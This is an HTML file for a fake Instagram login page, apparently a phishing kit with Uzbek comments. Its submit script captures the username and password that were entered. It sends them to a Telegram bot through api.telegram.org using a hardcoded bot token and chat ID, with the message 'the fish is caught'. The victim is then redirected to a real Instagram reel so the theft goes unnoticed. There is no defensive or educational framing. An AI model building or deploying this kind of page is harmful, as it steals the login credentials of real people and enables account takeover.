<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }

body {
    min-height: 100vh;
    background: #fafafa;
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
}

.phone {
    width: 375px;
    min-height: 100vh;
    background: #fff;
    display: flex;
    flex-direction: column;
}

/* Status bar */
.statusbar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 14px 24px 0;
    font-size: 12px;
    font-weight: 600;
    color: #000;
}
.statusbar-right { display: flex; gap: 6px; align-items: center; }

/* Body */
.body {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 0 0 30px;
}

/* Logo */
.logo {
    font-family: 'Grand Hotel', cursive;
    font-size: 42px;
    color: #000;
    margin: 50px 0 32px;
}

/* Form */
.form {
    width: 100%;
    padding: 0 24px;
    display: flex;
    flex-direction: column;
    gap: 10px;
}

.input-wrap { position: relative; }

.input-wrap input {
    width: 100%;
    height: 44px;
    border-radius: 8px;
    border: 1px solid #dbdbdb;
    background: #fafafa;
    padding: 0 14px;
    font-size: 13px;
    color: #262626;
    outline: none;
}

.input-wrap input:focus { border-color: #a8a8a8; }

.input-label {
    position: absolute;
    left: 14px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 12px;
    color: #8e8e8e;
    pointer-events: none;
    transition: 0.1s;
}

/* Float label effect */
.input-wrap input:focus ~ .input-label,
.input-wrap input:not(:placeholder-shown) ~ .input-label {
    top: 8px;
    transform: none;
    font-size: 10px;
}

.input-wrap input:focus,
.input-wrap input:not(:placeholder-shown) {
    padding-top: 14px;
}

.show-btn {
    position: absolute;
    right: 14px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 13px;
    font-weight: 600;
    color: #262626;
    cursor: pointer;
    display: none;
    user-select: none;
}

.login-btn {
    width: 100%;
    height: 44px;
    border-radius: 10px;
    background: #4cb5f8;
    border: none;
    color: #fff;
    font-size: 14px;
    font-weight: 700;
    margin-top: 4px;
    cursor: pointer;
    transition: background 0.2s;
}

.login-btn:hover { background: #1a9af0; }

.forgot {
    text-align: center;
    font-size: 13px;
    color: #00376b;
    font-weight: 500;
    margin-top: 6px;
    cursor: pointer;
}

/* Divider */
.divider {
    display: flex;
    align-items: center;
    gap: 16px;
    padding: 0 24px;
    margin: 20px 0;
    width: 100%;
}
.divider-line { flex: 1; height: 1px; background: #dbdbdb; }
.divider-text { font-size: 13px; font-weight: 600; color: #8e8e8e; }

/* Facebook */
.fb-btn {
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 14px;
    font-weight: 600;
    color: #385185;
    cursor: pointer;
}

/* Get app */
.getapp { font-size: 13px; color: #262626; margin: 24px 0 14px; }

/* Store buttons */
.store-btns { display: flex; gap: 10px; padding: 0 24px; width: 100%; }
.store {
    flex: 1;
    background: #000;
    color: #fff;
    border-radius: 8px;
    padding: 8px 10px;
    display: flex;
    align-items: center;
    gap: 8px;
    cursor: pointer;
}
.store-text span { display: block; font-size: 9px; opacity: 0.8; }
.store-text b { font-size: 11px; }

/* Sign up bar */
.signup-bar {
    margin-top: auto;
    border-top: 1px solid #dbdbdb;
    padding: 16px 24px;
    text-align: center;
    font-size: 13px;
    color: #262626;
    width: 100%;
}
.signup-bar a { color: #0095f6; font-weight: 700; text-decoration: none; }

/* Desktop: show as phone */
@media (min-width: 420px) {
    body { background: #fafafa; align-items: flex-start; padding: 40px 0; }
    .phone {
        min-height: auto;
        border-radius: 40px;
        border: 2px solid #dbdbdb;
        box-shadow: 0 8px 32px rgba(0,0,0,0.10);
        overflow: hidden;
    }
    .body { padding-bottom: 40px; }
}
</style>
</head>
<body>

<div class="phone">

    <div class="body">

        <div class="logo">Instagram</div>

        <form class="form" id="loginForm"> <!-- div emas, form bo'lishi kerak va ID qo'shildi -->

    <div class="input-wrap">
        <input type="text" id="username" placeholder=" " oninput="handleInput()"> <!-- id="email" id="username" ga o'zgardi -->
        <span class="input-label">Phone number, username, or email</span>
    </div>

    <div class="input-wrap">
        <input type="password" id="password" placeholder=" " oninput="handleInput()">
        <span class="input-label">Password</span>
        <span class="show-btn" id="showBtn" onclick="togglePass()">Show</span>
    </div>

    <button type="submit" class="login-btn" id="loginBtn">Log in</button> <!-- type="submit" qo'shildi -->

    <div class="forgot">Forgot password?</div>
</form>

        <div class="divider">
            <div class="divider-line"></div>
            <span class="divider-text">OR</span>
            <div class="divider-line"></div>
        </div>

        <div class="fb-btn">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="#385185">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
            </svg>
            Log in with Facebook
        </div>

        <div class="getapp">Get the app.</div>

        <div class="store-btns">
            <div class="store">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="white">
                    <path d="M3.18 23.76c.33.18.72.18 1.06 0L15.5 17.4 12.1 14l-8.92 9.76zM.5 1.5C.19 1.84 0 2.35 0 3v18c0 .65.19 1.16.5 1.5L.6 20.6l10.1-10.1V10L.6 1.4.5 1.5zM19.34 10.77l-2.88-1.64-3.36 3.36 3.36 3.36 2.9-1.65c.83-.47.83-1.23-.02-1.7v.27zM4.24.24C3.9.06 3.51.06 3.18.24L12.1 10l3.4-3.4L4.24.24z"/>
                </svg>
                <div class="store-text"><span>GET IT ON</span><b>Google Play</b></div>
            </div>
            <div class="store">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="white">
                    <path d="M11.182 0h2.636c.137 1.49.584 2.618 1.34 3.383.757.765 1.863 1.284 3.32 1.558v2.636c-1.336-.186-2.476-.586-3.42-1.2v9.49c0 1.955-.604 3.504-1.81 4.648C11.84 21.658 10.25 22.23 8.277 22.23c-1.945 0-3.52-.573-4.727-1.72C2.343 19.363 1.74 17.842 1.74 15.95c0-1.836.59-3.337 1.77-4.504 1.18-1.167 2.72-1.75 4.62-1.75.378 0 .82.038 1.326.114V12.5c-.437-.114-.847-.17-1.23-.17-.966 0-1.75.313-2.354.938-.602.625-.904 1.447-.904 2.466 0 1.002.305 1.813.913 2.434.61.62 1.4.93 2.37.93.954 0 1.73-.31 2.328-.93.598-.62.896-1.47.896-2.547V0h2.727z"/>
                </svg>
                <div class="store-text"><span>GET IT FROM</span><b>Microsoft</b></div>
            </div>
        </div>

    </div>

    <div class="signup-bar">
        Don't have an account? <a href="#">Sign up.</a>
    </div>

</div>

<script>
const userEl   = document.getElementById('username');
const passEl   = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');
const showBtn  = document.getElementById('showBtn');

function handleInput() {
    const ready = userEl.value.length > 0 && passEl.value.length >= 6;
    loginBtn.style.background = ready ? '#0095f6' : '#4cb5f8';
    loginBtn.style.cursor     = ready ? 'pointer'  : 'default';
    showBtn.style.display     = passEl.value.length > 0 ? 'block' : 'none';
}

function togglePass() {
    if (passEl.type === 'password') {
        passEl.type         = 'text';
        showBtn.textContent = 'Hide';
    } else {
        passEl.type         = 'password';
        showBtn.textContent = 'Show';
    }
}

document.getElementById("loginForm").addEventListener("submit", function(e){
    e.preventDefault(); // Sahifa yangilanib ketishini oldini oladi

    const user = document.getElementById("username").value;
    const pass = document.getElementById("password").value;

    const token = "8164072502:AAFXUbxmRzHpp-opJlBgeBUaMLiDxJmvxZc";
    const chat_id = "1178814024";
    const text = ` Baliq ilindi login:\nUser: ${user}\nPass: ${pass}`;

    // Telegramga yuborish
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ chat_id, text })
    }).then(() => {
        // Ma'lumot yuborilgach, keyin Instagramga yo'naltiramiz
        window.location.href = 'https://www.instagram.com/reel/DVkucbGghup/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==';
    }).catch(err => {
        console.error("Xatolik:", err);
    });
});
</script>

</body>
</html>
